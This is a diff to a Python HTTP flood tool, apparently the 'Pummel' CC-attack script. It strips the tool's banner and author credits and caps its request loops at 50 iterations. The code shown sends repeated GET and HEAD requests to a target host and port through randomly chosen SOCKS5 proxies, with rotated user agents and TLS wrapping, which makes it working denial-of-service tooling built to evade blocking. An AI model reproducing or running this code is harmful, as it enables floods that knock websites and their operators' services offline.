@@ -9,23 +9,6 @@ import requests
 import socks
 import ssl
 
-print('''\r\n
-██████╗ ██╗   ██╗███╗   ███╗███╗   ███╗███████╗██╗         
-██╔══██╗██║   ██║████╗ ████║████╗ ████║██╔════╝██║         
-██████╔╝██║   ██║██╔████╔██║██╔████╔██║█████╗  ██║         
-██╔═══╝ ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║         
-██║     ╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████╗    
-╚═╝      ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝   
-┌─────────────────────────────────────────────────────┐
-│ version 1.2.8                                       │
-│                                                     │
-│          [!!!Prevent Illegal CC-Attack!!!]          │                      
-│                                                     │
-│                               Code By HC the Chlous │
-├─────────────────────────────────────────────────────┤
-│       Github: https://github.com/HC133/Pummel	      │
-│           [!]DO NOT ATTACK GOV WEBSITE[!]           │
-└─────────────────────────────────────────────────────┘\r\n''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
             "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -275,12 +258,12 @@ def get():
     ua = random.choice(useragents)
     request = get_host + ua + accept + connection
     proxy = random.choice(proxies).strip().split(":")
-    while 1:
+    for __ in range(50):
         try:
             socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
             if port == 443:
-                ctx = ssl.SSLContext()#credits to leeon123
+                ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s,server_hostname=str(ip))
             s.connect((str(ip), int(port)))
             for _ in range(multiple):
@@ -297,7 +280,7 @@ def head():
     ua = random.choice(useragents)
     request = head_host + ua + accept + connection
     proxy = random.choice(proxies).strip().split(":")
-    while 1:
+    for __ in range(50):
         try:
             socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
@@ -386,5 +369,3 @@ while True:
             sys.stdout.write("\n")
             sys.stdout.flush()
             break
-#Code By HC the Chlous
-#Credits: Leeon123 and 4l3xPr0
